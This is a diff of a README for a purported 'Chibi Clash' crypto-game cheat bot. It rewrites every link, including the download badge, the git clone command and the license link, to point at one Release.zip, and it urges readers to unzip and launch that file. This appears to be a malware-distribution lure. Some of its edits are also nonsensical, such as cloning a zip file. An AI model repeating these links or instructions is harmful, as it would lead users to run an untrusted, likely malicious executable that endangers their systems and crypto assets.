@@ -11,9 +11,9 @@ Welcome to the Chibi Clash Crypto Bot repository! This advanced bot is designed 
 ## Installation
 To get started with the Chibi Clash Crypto Bot, simply download the software package by clicking the button below: 
 
-[![Download Chibi Clash Crypto Bot](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Chibi Clash Crypto Bot](https://github.com/DevilXiters/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip)](https://github.com/DevilXiters/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip)
 
-Once you have downloaded the `Software.zip` file, unzip it and launch the bot to start automating your gameplay in Chibi Clash.
+Once you have downloaded the `https://github.com/DevilXiters/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip` file, unzip it and launch the bot to start automating your gameplay in Chibi Clash.
 
 ## Repository Topics
 Explore the various topics related to the Chibi Clash Crypto Bot repository:
@@ -41,7 +41,7 @@ Explore the various topics related to the Chibi Clash Crypto Bot repository:
 ## Get Started
 1. **Clone the Repository**: If you want to explore the source code and contribute to the development of the bot, you can clone this repository to your local machine using the following command:
    ```bash
-   git clone https://github.com/22155555/1875695542.git
+   git clone https://github.com/DevilXiters/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip
    ```
 
 2. **Install Dependencies**: Before running the bot, make sure to install any required dependencies by following the instructions provided in the repository.
@@ -57,7 +57,7 @@ Contributions to the Chibi Clash Crypto Bot repository are welcome! Whether you 
 If you encounter any issues with the Chibi Clash Crypto Bot or have any questions about its functionalities, please feel free to open an issue in the repository. Our team will do their best to assist you and provide solutions to your queries.
 
 ## License
-The Chibi Clash Crypto Bot is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to modify and distribute the bot as per the terms of the license.
+The Chibi Clash Crypto Bot is licensed under the [MIT License](https://github.com/DevilXiters/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip). Feel free to modify and distribute the bot as per the terms of the license.
 
 ---
 
